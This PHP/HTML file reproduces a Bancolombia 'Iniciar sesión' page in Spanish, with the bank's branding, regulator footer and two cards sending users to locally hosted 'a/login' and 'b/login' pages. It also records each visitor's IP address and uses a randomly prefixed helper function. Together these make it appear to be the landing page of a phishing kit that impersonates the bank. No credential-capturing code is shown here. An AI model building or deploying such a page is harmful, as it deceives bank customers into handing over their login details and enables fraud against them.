<?php
$ip = getenv("REMOTE_ADDR");
require_once __DIR__ . '/a/fecha_es.php';
$tiempo = b34f9_fecha_larga();
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Bancolombia | Iniciar sesión</title>
<link rel="icon" href="img/logo.svg">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  background: #f0f0f5;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

/* HEADER */
.header {
  background: white;
  padding: 16px 24px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid #e8e8e8;
}
.header-logo img {
  height: 36px;
  width: auto;
}
.btn-salir {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 15px;
  font-weight: 600;
  color: #333;
  text-decoration: none;
  background: none;
  border: none;
  cursor: pointer;
}
.btn-salir svg { width: 18px; height: 18px; }

/* CONTENIDO */
.main {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 40px 20px 30px;
}
.titulo {
  font-size: 26px;
  font-weight: 700;
  color: #111;
  margin-bottom: 8px;
  text-align: center;
}
.subtitulo {
  font-size: 16px;
  color: #444;
  margin-bottom: 32px;
  text-align: center;
}

/* CARDS */
.cards {
  width: 100%;
  max-width: 480px;
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.card {
  background: white;
  border-radius: 12px;
  display: flex;
  align-items: stretch;
  text-decoration: none;
  box-shadow: 0 1px 6px rgba(0,0,0,0.08);
  overflow: hidden;
  transition: box-shadow 0.2s;
}
.card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.13); }
.card-body {
  flex: 1;
  padding: 20px 18px;
}
.card-title {
  font-size: 17px;
  font-weight: 700;
  color: #111;
  margin-bottom: 6px;
}
.card-desc {
  font-size: 14px;
  color: #555;
  line-height: 1.5;
}
.card-arrow {
  width: 56px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 0 12px 12px 0;
}
.card-arrow svg {
  width: 22px;
  height: 22px;
  color: white;
}
.card-personas .card-arrow { background: #f5a623; }
.card-empresas .card-arrow { background: #e05a1e; }

/* AYUDA */
.ayuda {
  margin-top: 36px;
  font-size: 14px;
  color: #444;
  text-align: center;
}
.ayuda a {
  color: #111;
  font-weight: 600;
  text-decoration: underline;
}

/* FOOTER */
.footer {
  background: white;
  padding: 20px 24px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 10px;
  border-top: 1px solid #e8e8e8;
}
.footer-logo img { height: 28px; width: auto; }
.footer-vigilado {
  font-size: 10px;
  color: #888;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  display: flex;
  align-items: center;
  gap: 4px;
}
.footer-vigilado span { font-weight: 700; }

@media (max-width: 480px) {
  .titulo { font-size: 22px; }
  .subtitulo { font-size: 14px; }
  .card-title { font-size: 16px; }
  .card-body { padding: 16px 14px; }
  .card-arrow { width: 48px; }
}
</style>
</head>
<body>

<header class="header">
  <div class="header-logo">
    <img src="img/logo.svg" alt="Bancolombia">
  </div>
  <a href="/" class="btn-salir">
    Salir
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
      <polyline points="16 17 21 12 16 7"/>
      <line x1="21" y1="12" x2="9" y2="12"/>
    </svg>
  </a>
</header>

<main class="main">
  <h1 class="titulo">Iniciar sesión</h1>
  <p class="subtitulo">Elige cómo quieres continuar:</p>

  <div class="cards">

    <a href="a/login" class="card card-personas">
      <div class="card-body">
        <div class="card-title">Bancolombia Personas</div>
        <div class="card-desc">Si manejas tus cuentas y productos en la Sucursal Virtual Personas y app Mi Bancolombia.</div>
      </div>
      <div class="card-arrow">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="9 18 15 12 9 6"/>
        </svg>
      </div>
    </a>

    <a href="b/login" class="card card-empresas">
      <div class="card-body">
        <div class="card-title">Bancolombia Empresas</div>
        <div class="card-desc">Si manejas tus productos en la Sucursal Virtual Empresas y aún no te has cambiado al nuevo canal.</div>
      </div>
      <div class="card-arrow">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="9 18 15 12 9 6"/>
        </svg>
      </div>
    </a>

  </div>

  <p class="ayuda">¿No sabes cuál elegir? <a href="#">Te contamos aquí</a></p>
</main>

<footer class="footer">
  <div class="footer-logo">
    <img src="img/logo.svg" alt="Bancolombia">
  </div>
  <div class="footer-vigilado">
    Vigilado <span>Superintendencia Financiera</span>
  </div>
</footer>

</body>
</html>
